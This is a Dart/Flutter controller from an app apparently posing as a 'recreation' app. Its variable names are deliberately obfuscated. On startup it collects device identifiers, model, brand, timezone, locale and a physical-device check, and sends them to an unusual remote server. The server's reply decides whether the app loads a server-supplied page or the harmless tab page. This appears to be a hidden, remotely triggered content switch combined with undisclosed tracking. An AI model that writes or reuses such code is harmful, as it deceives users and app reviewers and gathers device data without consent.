import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wortbp = RxBool(false);
  var hqbfndrmpa = RxBool(true);
  var pcromgbk = RxString("");
  var sydni = RxBool(false);
  var schowalter = RxBool(true);
  final rcglanuzto = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    oipvnma();
  }


  Future<void> oipvnma() async {

    sydni.value = true;
    schowalter.value = true;
    hqbfndrmpa.value = false;

    rcglanuzto.post("https://yia.unsay.live/VBSRS7DLIQZL",data: await ywphtezbf()).then((value) {
      var gyes = value.data["gyes"] as String;
      var puxgdktz = value.data["puxgdktz"] as bool;
      if (puxgdktz) {
        pcromgbk.value = gyes;
        braeden();
      } else {
        schaefer();
      }
    }).catchError((e) {
      hqbfndrmpa.value = true;
      schowalter.value = true;
      sydni.value = false;
    });
  }

  Future<Map<String, dynamic>> ywphtezbf() async {
    final DeviceInfoPlugin olrvtxc = DeviceInfoPlugin();
    PackageInfo wstpog_xqepnta = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dgbtfmi = Platform.localeName;
    var fyod_IfapWstZ = currentTimeZone;

    var fyod_oAVdIK = wstpog_xqepnta.packageName;
    var fyod_uRr = wstpog_xqepnta.version;
    var fyod_QvuWILbG = wstpog_xqepnta.buildNumber;

    var fyod_ZUdiWC = wstpog_xqepnta.appName;
    var alisonJacobson = "";
    var fyod_Lo = "";
    var fyod_CJ = "";
    var kaylahRogahn = "";
    var fyod_JLnZgls  = "";
    var buckBode = "";
    var casandraGrant = "";


    var fyod_CSYKv = "";
    var fyod_AniyjNI = false;

    if (GetPlatform.isAndroid) {
      fyod_CSYKv = "android";
      var gvdjbz = await olrvtxc.androidInfo;

      fyod_CJ = gvdjbz.brand;

      fyod_Lo  = gvdjbz.model;
      fyod_JLnZgls = gvdjbz.id;

      fyod_AniyjNI = gvdjbz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fyod_CSYKv = "ios";
      var nflhyumi = await olrvtxc.iosInfo;
      fyod_CJ = nflhyumi.name;
      fyod_Lo = nflhyumi.model;

      fyod_JLnZgls = nflhyumi.identifierForVendor ?? "";
      fyod_AniyjNI  = nflhyumi.isPhysicalDevice;
    }

    var res = {
      "fyod_ZUdiWC": fyod_ZUdiWC,
      "fyod_IfapWstZ": fyod_IfapWstZ,
      "fyod_uRr": fyod_uRr,
      "fyod_oAVdIK": fyod_oAVdIK,
      "fyod_CJ": fyod_CJ,
      "fyod_QvuWILbG": fyod_QvuWILbG,
      "fyod_JLnZgls": fyod_JLnZgls,
      "fyod_Lo": fyod_Lo,
      "dgbtfmi": dgbtfmi,
      "fyod_AniyjNI": fyod_AniyjNI,
      "fyod_CSYKv": fyod_CSYKv,
      "casandraGrant" : casandraGrant,
      "alisonJacobson" : alisonJacobson,
      "kaylahRogahn" : kaylahRogahn,
      "buckBode" : buckBode,

    };
    return res;
  }

  Future<void> schaefer() async {
    Get.offAllNamed("/recreationTabPage");
  }

  Future<void> braeden() async {
    Get.offAllNamed("/recreationTopicTool");
  }

}
